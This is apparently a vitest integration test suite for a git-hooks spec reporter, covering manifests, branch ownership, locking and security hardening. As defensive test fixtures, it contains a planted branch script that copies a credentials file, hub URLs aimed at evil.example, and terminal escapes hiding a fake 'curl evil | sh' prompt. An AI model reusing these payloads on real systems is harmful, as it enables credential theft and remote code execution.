import { spawnSync } from 'node:child_process'
import { existsSync, readFileSync, statSync, writeFileSync } from 'node:fs'
import type { AddressInfo } from 'node:net'
import { join } from 'node:path'
import { serve } from '@hono/node-server'
import { and, eq } from 'drizzle-orm'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { app } from '../../src/app.ts'
import { db } from '../../src/db/client.ts'
import { clone, cloneBranch, cloneFeature } from '../../src/db/schema.ts'
import { addMember, createProject, createToken, createUser, truncateAll } from '../helpers.ts'
import { CONFIG, type Hub, Sandbox, SCRIPT, SELF, startHub, stopHub, waitFor } from './harness.ts'

let hub: Hub
let seq = 0

beforeAll(async () => {
  await truncateAll()
  hub = await startHub()
})

afterAll(async () => {
  await stopHub(hub)
})

const SPEC = '# Feature Specification: X\n\nSome text.\n'

type Manifest = {
  branches: {
    name: string
    pushed: boolean
    features: { dir: string; author: { name: string; email: string } | null }[]
  }[]
}

async function member(defaultBranch?: string) {
  seq++
  const u = await createUser(`hard${seq}`)
  const p = await createProject(`hard${seq}`, defaultBranch ? { defaultBranch } : {})
  await addMember(p, u)
  return { user: u, project: p, token: await createToken(u) }
}

async function connectedClone(opts: { port?: number; initialFiles?: Record<string, string> } = {}) {
  const m = await member()
  const sb = new Sandbox()
  const repo = sb.repo({
    hubPort: opts.port ?? hub.port,
    project: m.project.slug,
    ...(opts.initialFiles ? { initialFiles: opts.initialFiles } : {}),
  })
  await repo.connect(m.token.key)
  return { ...m, sb, repo, cloneId: repo.cloneId() }
}

const featureRow = async (cloneId: string, branch: string, dir: string) =>
  (
    await db
      .select()
      .from(cloneFeature)
      .where(
        and(eq(cloneFeature.cloneId, cloneId), eq(cloneFeature.branch, branch), eq(cloneFeature.dir, dir)),
      )
  )[0]

async function manifest(repo: {
  spechub: (a: string[]) => Promise<{ status: number | null; stdout: string }>
}) {
  const r = await repo.spechub(['report', '--print-manifest'])
  expect(r.status).toBe(0)
  return JSON.parse(r.stdout) as Manifest
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

describe('reporter hardening (verify round A)', () => {
  it('clone-managed hooks run the copy in the git dir, never a checked-out branch script', async () => {
    const { sb, repo, cloneId } = await connectedClone()
    const copy = join(repo.commonDir(), 'spec-hub', 'spec-hub')
    expect(readFileSync(copy, 'utf8')).toBe(readFileSync(SCRIPT, 'utf8'))
    expect(statSync(copy).mode & 0o777).toBe(0o700)
    for (const e of ['post-commit', 'post-checkout', 'post-merge', 'post-rewrite']) {
      const hook = readFileSync(join(repo.commonDir(), 'hooks', e), 'utf8')
      expect(hook).toBe(`#!/bin/sh\n# spec-hub\n[ -x '${copy}' ] && sh '${copy}' hook ${e} || true\n`)
    }

    // the stolen-credentials reproduction: a branch replaces the work tree's script
    const stolen = join(sb.root, 'stolen')
    repo.git('checkout', '-q', '-b', 'evil')
    repo.write(SELF, `#!/bin/sh\ncat "$XDG_CONFIG_HOME/spec-hub/credentials" > '${stolen}'\n`)
    repo.write('specs/001-e/spec.md', SPEC)
    repo.commit([SELF, 'specs/001-e/spec.md'], 'evil script')
    repo.git('checkout', '-q', 'main')
    repo.git('checkout', '-q', 'evil')
    await waitFor(() => featureRow(cloneId, 'evil', '001-e'), 'the real reporter to report the evil branch')
    expect(existsSync(stolen)).toBe(false)

    // connect again (from main's script) refreshes the copy
    repo.git('checkout', '-q', 'main')
    writeFileSync(copy, '#!/bin/sh\nexit 0\n')
    expect((await repo.spechub(['connect'])).status).toBe(0)
    expect(readFileSync(copy, 'utf8')).toBe(readFileSync(SCRIPT, 'utf8'))
    expect((await repo.spechub(['status'])).stdout).toContain('missing:   none')
  })

  it('refuses a hub_url with user info or plain http to another host, and a bad project slug', async () => {
    const sb = new Sandbox()
    const repo = sb.repo({ hubPort: hub.port, project: 'unused' })
    const cases: [string, string, RegExp][] = [
      [`http://evil.example@127.0.0.1:${hub.port}`, 'unused', /user info/],
      ['https://u:p@hub.example.com', 'unused', /user info/],
      ['http://hub.example.com', 'unused', /https:\/\//],
      ['http://localhost.evil.example:80', 'unused', /https:\/\//],
      [`http://127.0.0.1:${hub.port}`, '../admin', /project slug/],
    ]
    for (const [url, project, err] of cases) {
      repo.write(CONFIG, `hub_url: ${url}\nproject: ${project}\n`)
      const r = await repo.spechub(['connect'], { input: 'some-token\n' })
      expect(r.status, url).toBe(1)
      expect(r.stderr).toMatch(err)
    }
    expect(existsSync(join(sb.root, 'xdg', 'spec-hub', 'credentials'))).toBe(false)
  })

  it('never prints terminal escapes from a committed config', async () => {
    const sb = new Sandbox()
    const repo = sb.repo({ hubPort: hub.port, project: 'unused' })
    const esc = '\u001b]0;pwned\u0007\u001b[2JFAKE: run curl evil | sh'
    repo.write(CONFIG, `hub_url: http://127.0.0.1:${hub.port}\nproject: x${esc}\nremote: o${esc}\n`)
    for (const args of [['status'], ['report', '--print-manifest']]) {
      const r = await repo.spechub(args)
      expect(`${r.stdout}${r.stderr}`, args.join(' ')).not.toContain('\u001b')
    }
  })

  it('a tag with the same name neither defeats a private prefix nor replaces the branch', async () => {
    const { repo } = await connectedClone()
    expect((await repo.spechub(['private', 'add', 'scratch/'])).status).toBe(0)
    repo.git('checkout', '-q', '-b', 'scratch/y')
    repo.write('specs/002-y/spec.md', SPEC)
    repo.commit(['specs/002-y/spec.md'], 'private spec')
    repo.git('tag', 'scratch/y', 'main')
    repo.git('checkout', '-q', '-b', '003-pub', 'main')
    repo.write('specs/003-pub/spec.md', SPEC)
    repo.commit(['specs/003-pub/spec.md'], 'public spec')
    repo.git('tag', '003-pub', 'main')
    repo.git('checkout', '-q', 'main')

    const m = await manifest(repo)
    expect(m.branches.map((b) => b.name)).toEqual(['003-pub'])
    expect(m.branches[0]?.features.map((f) => f.dir)).toEqual(['003-pub'])
  })

  it('records an error and sends nothing when the remote has no default branch', async () => {
    const { project, token } = await member('trunk')
    const sb = new Sandbox()
    const repo = sb.repo({ hubPort: hub.port, project: project.slug })
    repo.git('checkout', '-q', '-b', '004-x')
    repo.write('specs/004-x/spec.md', SPEC)
    repo.git('add', '-A')
    repo.git('commit', '-q', '-m', 'feature')

    const r = await repo.spechub(['connect'], { input: `${token.key}\n` })
    expect(r.status).toBe(1)
    expect(r.stderr).toContain(
      "origin/trunk not found; check the project's default branch on the hub (it is trunk)",
    )
    expect(readFileSync(join(repo.commonDir(), 'spec-hub', 'error'), 'utf8')).toMatch(
      /^origin\/trunk not found/,
    )
    expect(await db.select().from(clone).where(eq(clone.id, repo.cloneId()))).toEqual([])
    expect(await db.select().from(cloneBranch).where(eq(cloneBranch.cloneId, repo.cloneId()))).toEqual([])
  })

  it.skipIf(spawnSync('ssh-keygen', ['-?']).error !== undefined)(
    'signed commits with log.showSignature still give a valid manifest',
    async () => {
      const { sb, repo, cloneId } = await connectedClone()
      const key = join(sb.root, 'signing-key')
      expect(spawnSync('ssh-keygen', ['-q', '-t', 'ed25519', '-N', '', '-f', key]).status).toBe(0)
      repo.git('config', 'gpg.format', 'ssh')
      repo.git('config', 'user.signingkey', key)
      repo.git('config', 'commit.gpgsign', 'true')
      repo.git('config', 'log.showSignature', 'true')
      repo.git('checkout', '-q', '-b', '005-s')
      repo.write('specs/005-s/spec.md', SPEC)
      repo.commit(['specs/005-s/spec.md'], 'signed')
      expect(repo.git('log', '-1', '--format=%ct')).toMatch(/signature/i) // the config is in effect

      const m = await manifest(repo)
      expect(m.branches.find((b) => b.name === '005-s')?.features).toMatchObject([
        { dir: '005-s', author: { name: 'Test Dev' } },
      ])
      await waitFor(() => featureRow(cloneId, '005-s', '005-s'), 'signed feature stored')
    },
  )

  it('pushed means the tip is on the remote, whatever the upstream says', async () => {
    const { repo } = await connectedClone()
    repo.git('checkout', '-q', '-b', '006-p', 'origin/main') // upstream: origin/main
    repo.write('specs/006-p/spec.md', SPEC)
    repo.commit(['specs/006-p/spec.md'], 'feature')
    repo.git('push', '-q', 'origin', '006-p')
    expect((await manifest(repo)).branches.find((b) => b.name === '006-p')?.pushed).toBe(true)

    repo.write('specs/006-p/plan.md', '# Plan\n')
    repo.commit(['specs/006-p/plan.md'], 'local only')
    expect((await manifest(repo)).branches.find((b) => b.name === '006-p')?.pushed).toBe(false)
  })

  it('the owner is whoever added spec.md, across renames and for features that landed earlier', async () => {
    const { repo } = await connectedClone({ initialFiles: { 'specs/000-landed/spec.md': SPEC } })
    const alice = { GIT_AUTHOR_NAME: 'Alice', GIT_AUTHOR_EMAIL: 'alice@example.test' }
    const bob = { GIT_AUTHOR_NAME: 'Bob', GIT_AUTHOR_EMAIL: 'bob@example.test' }
    repo.git('checkout', '-q', '-b', '007-r')
    repo.write('specs/001-old/spec.md', SPEC)
    repo.commit(['specs/001-old'], 'add', alice)
    repo.git('mv', 'specs/001-old', 'specs/007-r')
    repo.commit(['specs'], 'rename', bob)
    repo.write('specs/000-landed/spec.md', `${SPEC}\nEdited by Bob.\n`)
    repo.commit(['specs/000-landed'], 'edit landed', bob)

    const features = (await manifest(repo)).branches.find((b) => b.name === '007-r')?.features
    expect(features).toEqual([
      expect.objectContaining({ dir: '000-landed', author: { name: 'Test Dev', email: 'dev@example.test' } }),
      expect.objectContaining({ dir: '007-r', author: { name: 'Alice', email: 'alice@example.test' } }),
    ])
  })

  it('a feature that landed by rebase-merge is not in flight; a genuine extra change to it is', async () => {
    const { repo } = await connectedClone()
    repo.git('checkout', '-q', '-b', '009-rb')
    repo.write('specs/009-rb/spec.md', SPEC)
    repo.commit(['specs/009-rb'], 'spec')
    repo.write('specs/009-rb/plan.md', '# Plan\n')
    repo.commit(['specs/009-rb'], 'plan')
    const carried = async (branch: string) =>
      (await manifest(repo)).branches.find((b) => b.name === branch)?.features.map((f) => f.dir)
    expect(await carried('009-rb')).toEqual(['009-rb'])

    // GitHub's rebase-merge: the branch's commits are replayed onto a newer main as new commits,
    // and main edits the spec after landing; the local branch keeps its original commits.
    repo.git('checkout', '-q', 'main')
    repo.write('README.md', '# test\n\nNewer main.\n')
    repo.commit(['README.md'], 'unrelated')
    repo.git('cherry-pick', 'main..009-rb')
    repo.write('specs/009-rb/spec.md', `${SPEC}\n**Status**: Shipped\n`)
    repo.commit(['specs/009-rb'], 'status')
    repo.git('push', '-q', 'origin', 'main')
    expect(await carried('009-rb')).toEqual([])

    // Extra work on the landed feature that main does not have is still reported, also on a
    // second branch carrying it, and connect counts the feature once.
    repo.git('checkout', '-q', '-b', '010-more', '009-rb')
    repo.write('specs/009-rb/tasks.md', '# Tasks\n')
    repo.commit(['specs/009-rb'], 'tasks')
    repo.git('branch', '011-copy')
    expect(await carried('009-rb')).toEqual([])
    expect(await carried('010-more')).toEqual(['009-rb'])
    expect(await carried('011-copy')).toEqual(['009-rb'])
    expect((await repo.connect('unused')).stdout).toMatch(/: 1 features in flight\.$/m)
  })

  it('records a clear error when the clone id belongs to someone else', async () => {
    const { repo, sb } = await connectedClone()
    const other = await member()
    const creds = join(sb.root, 'xdg', 'spec-hub', 'credentials')
    writeFileSync(creds, readFileSync(creds, 'utf8').replace(/ \S+\n$/, ` ${other.token.key}\n`))
    repo.writeConfig(hub.port, other.project.slug)
    const r = await repo.spechub(['report'])
    expect(r.stdout).toMatch(
      /^this clone id is registered to another person or project; run: sh .+ disconnect && sh .+ connect$/m,
    )
  })

  it('a burst of hooks runs one report at a time and still reports the final state', async () => {
    let inflight = 0
    let maxInflight = 0
    let reports = 0
    const slow = await new Promise<Hub>((resolve) => {
      const server = serve(
        {
          fetch: async (req) => {
            inflight++
            maxInflight = Math.max(maxInflight, inflight)
            try {
              if (new URL(req.url).pathname.endsWith('/reports')) reports++
              await sleep(150)
              return await app.fetch(req)
            } finally {
              inflight--
            }
          },
          port: 0,
          hostname: '127.0.0.1',
        },
        (info: AddressInfo) => resolve({ server, port: info.port }),
      )
    })
    try {
      const { repo, cloneId } = await connectedClone({ port: slow.port })
      const state = join(repo.commonDir(), 'spec-hub')
      maxInflight = 0
      reports = 0
      repo.git('checkout', '-q', '-b', '008-s')
      repo.write('specs/008-s/spec.md', SPEC)
      repo.commit(['specs/008-s/spec.md'], 'spec')
      for (let i = 0; i < 20; i++) expect(repo.spechubSync(['hook', 'post-rewrite']).status).toBe(0)
      repo.write('specs/008-s/plan.md', '# Plan\n')
      repo.commit(['specs/008-s/plan.md'], 'plan')

      const settled = async () => {
        const f = await featureRow(cloneId, '008-s', '008-s')
        const idle = !existsSync(join(state, 'lock')) && !existsSync(join(state, 'pending'))
        return f?.planOid && idle ? f : undefined
      }
      await waitFor(settled, 'the last commit reported and the lock released', 20_000)
      await sleep(1000) // stragglers that started late
      expect(await settled()).toBeDefined()
      expect(maxInflight).toBe(1)
      expect(reports).toBeGreaterThanOrEqual(1)
      expect(reports).toBeLessThan(6)
      console.log(`hook burst of 22: ${reports} reports, at most ${maxInflight} request in flight`)
    } finally {
      await stopHub(slow)
    }
  })
})
